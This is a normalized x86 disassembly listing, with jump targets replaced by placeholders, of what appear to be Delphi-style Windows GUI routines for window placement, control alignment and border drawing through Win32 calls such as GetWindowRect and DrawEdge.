push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_450a14
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450a1b
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403350
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4057d4
sub_450a2c
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_449474
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_450ae4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4185b0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418454
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403350
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_450b44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_450c3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403350
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c41
mov eax [ ebp - 0x14 ]
call sub_403154
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41860c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4185b0
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403350
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_450c50
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_450b44
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_450c7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_450cc4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4503c4
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44a090
sub_450d0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_450d90
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44d44c
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_451152
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44d44c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_450d0c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_451169
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_450d90
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44ae70
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4511a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44bcf4
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_449788
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4511f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bf14
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_451220
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor ecx ecx
push ebp
push sub_45134f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d44c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451356
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44d410
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_451356
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403350
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403350
jmp r-xdata
sub_4513ec
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44afd4
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44afd4
sub_451430
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44afd4
sub_4514a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_451530
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_451796
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424828
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43dfe8
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43e648
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4517d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b30
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_449964
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44e008
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44afd4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44c198
sub_451844
push ebx
push esi
mov esi edx
call sub_460ae8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406ab8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44afd4
